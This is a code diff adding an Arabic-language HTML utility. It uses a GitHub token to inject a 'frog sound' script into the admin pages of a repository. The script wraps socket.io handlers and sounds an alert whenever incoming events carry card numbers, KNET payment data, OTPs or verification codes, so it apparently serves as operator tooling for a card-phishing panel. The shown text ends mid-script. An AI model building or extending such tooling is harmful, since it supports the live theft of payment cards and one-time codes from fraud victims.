@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KDD - صوت الفقّة v3</title>
+<style>
+ body{font-family:system-ui,Segoe UI,Tahoma,sans-serif;background:#0f1115;color:#e8eaf0;margin:0;padding:20px}
+ .wrap{max-width:820px;margin:0 auto}
+ h1{font-size:20px;margin:0 0 4px}
+ p.sub{color:#9aa3b2;font-size:13px;margin:0 0 18px}
+ .card{background:#171a21;border:1px solid #242a35;border-radius:12px;padding:16px;margin-bottom:14px}
+ label{display:block;font-size:13px;color:#9aa3b2;margin-bottom:6px}
+ input{width:100%;box-sizing:border-box;background:#0d0f13;border:1px solid #2b3240;color:#e8eaf0;border-radius:9px;padding:11px;font-size:14px;direction:ltr}
+ .row{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
+ button{flex:1;min-width:150px;border:0;border-radius:9px;padding:13px;font-size:15px;font-weight:700;cursor:pointer}
+ .go{background:#2ecc71;color:#06210f}
+ .test{background:#2b3240;color:#e8eaf0}
+ .alt{background:#1f2a3a;color:#9ecbff}
+ button:disabled{opacity:.5;cursor:default}
+ #log{background:#0b0d11;border:1px solid #242a35;border-radius:12px;padding:14px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;white-space:pre-wrap;min-height:140px;direction:ltr;text-align:left;line-height:1.7}
+ .ok{color:#2ecc71}.er{color:#ff6b6b}.in{color:#7fb3ff}.wn{color:#ffd166}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>صوت الفقّة - الملخص + الكي نت/البطاقة + الرمز فقط</h1>
+  <p class="sub">اضغط M للكتم. أول دوسة بالصفحة تفعّل الصوت.</p>
+
+  <div class="card">
+    <label>GitHub Token (repo scope)</label>
+    <input id="tok" placeholder="ghp_..." autocomplete="off">
+    <div class="row">
+      <button class="go" id="run">تثبيت / تحديث الفلتر</button>
+      <button class="test" id="tst">تجربة الصوت</button>
+      <button class="alt" id="chk">اختبار الاتصال</button>
+    </div>
+  </div>
+
+  <div id="log"></div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+  function $(id){ return document.getElementById(id); }
+  function log(t,cls){ var el=$('log'); if(!el) return; var d=document.createElement('div'); if(cls) d.className=cls; d.textContent=t; el.appendChild(d); el.scrollTop=el.scrollHeight; }
+  window.__kddLog=log;
+
+  var CT='</scr'+'ipt>';
+  var REPO='fahshomi-ui/KDD', BRANCH='main';
+  var FILES=['server/admin/index.html','kdd-public/admin.html'];
+
+  var FROG = '<scr'+'ipt>/*FROG-SOUND3*/\n' +
+  '(function(){\n' +
+  '  var AC=window.AudioContext||window.webkitAudioContext, ac=null;\n' +
+  '  var muted=(localStorage.getItem("kdd_frog_mute")==="1"), last=0;\n' +
+  '  var BLOCK=/connect|disconnect|reconnect|pagechanged|navigate|hide|error|action/i;\n' +
+  '  var ALLOW=/data|card|code|live|knet|pay|otp|verif|summary|ملخص|رمز/i;\n' +
+  '  function shouldPlay(ev,args){\n' +
+  '    var n=String(ev);\n' +
+  '    if(BLOCK.test(n)) return false;\n' +
+  '    if(ALLOW.test(n)) return true;\n' +
+  '    try{\n' +
+  '      var s=JSON.stringify(Array.prototype.slice.call(args));\n' +
+  '      if(/digitCode|"code"|رمز|cardNumber|knet|ملخص|dataHistory|summary|otp/i.test(s)) return true;\n' +
+  '    }catch(e){}\n' +
+  '    return false;\n' +
+  '  }\n' +
+  '  function play(){\n' +
+  '    try{\n' +
+  '      if(muted||!AC) return;\n' +
+  '      var n=Date.now(); if(n-last<120) return; last=n;\n' +
+  '      if(!ac) ac=new AC();\n' +
+  '      if(ac.state==="suspended"){ ac.resume(); }\n' +
+  '      var t=ac.currentTime;\n' +
+  '      function croak(s){\n' +
+  '        var o=ac.createOscillator(), g=ac.createGain();\n' +
+  '        o.type="sawtooth";\n' +
+  '        o.frequency.setValueAtTime(300,s);\n' +
+  '        o.frequency.exponentialRampToValueAtTime(150,s+0.09);\n' +
+  '        g.gain.setValueAtTime(0.0001,s);\n' +
+  '        g.gain.exponentialRampToValueAtTime(0.30,s+0.012);\n' +
+  '        g.gain.exponentialRampToValueAtTime(0.0001,s+0.11);\n' +
+  '        o.connect(g); g.connect(ac.destination);\n' +
+  '        o.start(s); o.stop(s+0.13);\n' +
+  '      }\n' +
+  '      croak(t); croak(t+0.17);\n' +
+  '    }catch(e){}\n' +
+  '  }\n' +
+  '  window.__frogPlay=play;\n' +
+  '  ["click","keydown","touchstart","mousedown"].forEach(function(ev){\n' +
+  '    window.addEventListener(ev,function(){ try{ if(!ac&&AC) ac=new AC(); if(ac&&ac.state==="suspended") ac.resume(); }catch(e){} },{passive:true});\n' +
+  '  });\n' +
+  '  window.addEventListener("keydown",function(e){\n' +
+  '    var tg=(e.target&&e.target.tagName||"").toLowerCase();\n' +
+  '    if(tg==="input"||tg==="textarea") return;\n' +
+  '    if(e.key==="m"||e.key==="M"){ muted=!muted; localStorage.setItem("kdd_frog_mute",muted?"1":"0"); }\n' +
+  '  });\n' +
+  '  function hook(sock){\n' +
+  '    if(!sock||sock.__frogHooked) return;\n' +
+  '    sock.__frogHooked=true;\n' +
+  '    ["on","once"].forEach(function(m){\n' +
+  '      if(typeof sock[m]!=="function") return;\n' +
+  '      var orig=sock[m].bind(sock);\n' +
+  '      sock[m]=function(ev){\n' +
+  '        if(ev==="connect"||ev==="disconnect"||ev==="connect_error"||ev==="reconnect") return orig.apply(sock,arguments);\n' +
+  '        var rest=Array.prototype.slice.call(arguments,1).map(function(fn){\n' +
+  '          if(typeof fn!=="function") return fn;\n' +
+  '          return function(){ try{ if(shouldPlay(ev,arguments)) play(); }catch(e){} return fn.apply(this,arguments); };\n' +
+  '        });\n' +
+  '        return orig.apply(sock,[ev].concat(rest));\n' +
+  '      };\n' +
+  '    });\n' +
+  '  }\n' +
+  '  function wrapIo(){\n' +
+  '    if(!window.io||window.io.__frogWrapped) return false;\n' +
+  '    var o=window.io;\n' +
+  '    function w(){ var s=o.apply(this,arguments); try{ hook(s); }catch(e){} return s; }\n' +
+  '    for(var k in o){ try{ w[k]=o[k]; }catch(e){} }\n' +
+  '    w.__frogWrapped=true; window.io=w;
